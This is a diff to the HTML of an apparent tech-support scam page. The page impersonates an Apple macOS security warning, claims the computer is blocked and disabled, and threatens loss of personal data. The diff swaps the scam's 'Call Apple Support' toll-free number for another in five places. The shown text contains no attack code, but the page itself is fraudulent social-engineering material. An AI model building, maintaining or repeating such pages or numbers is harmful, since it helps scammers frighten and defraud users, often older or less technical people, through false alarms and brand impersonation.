@@ -251,7 +251,7 @@
           <div class="right-foot" style="text-align:center">
             <span id="footertxt">
               <img src="images/msmm.png"> MacOS Security </span>
-            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Apple Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-6502
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Apple Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-6086
               </span>
             </span>
           </div>
@@ -286,7 +286,7 @@
       </div>
       <img src="images/re.gif" id="banner">
       <div id="disclaimer">Access to this System has been blocked for security reasons.  <br>
-        <span class="support" style="font-size:22px;">Call Apple Support: &nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> +1-888-928-6502
+        <span class="support" style="font-size:22px;">Call Apple Support: &nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> +1-888-928-6086
           </span>
         </span>
       </div>
@@ -323,7 +323,7 @@
       <p>Call Apple Support immediately to report this threat, prevent identity theft, and unblock access to this device.</p>
       <p>By closing this window, you are putting your personal information at risk and you may have your MacOS registration suspended.</p>
       <p style="padding-bottom:0;color:#fff;font-size:16px">Call Apple Support: <strong>
-          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-6502
+          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-928-6086
           </span>
         </strong>
       </p>
@@ -334,7 +334,7 @@
     </div>
     <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
       <p style="color:#fff;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should contact us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
-        <strong>Call Apple Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +1-888-928-6502
+        <strong>Call Apple Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +1-888-928-6086
           </span>
         </strong>
       </p>
@@ -344,7 +344,7 @@
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Apple</span>
       <p style="font-weight:600;font-size:24px">Call Support: <br>
       </p>
-      <h4 style="font-weight:600;font-size:22px"> +1-888-928-6502
+      <h4 style="font-weight:600;font-size:22px"> +1-888-928-6086
         <br>(Security TollFree)
       </h4>
       <div class="arrow-down">
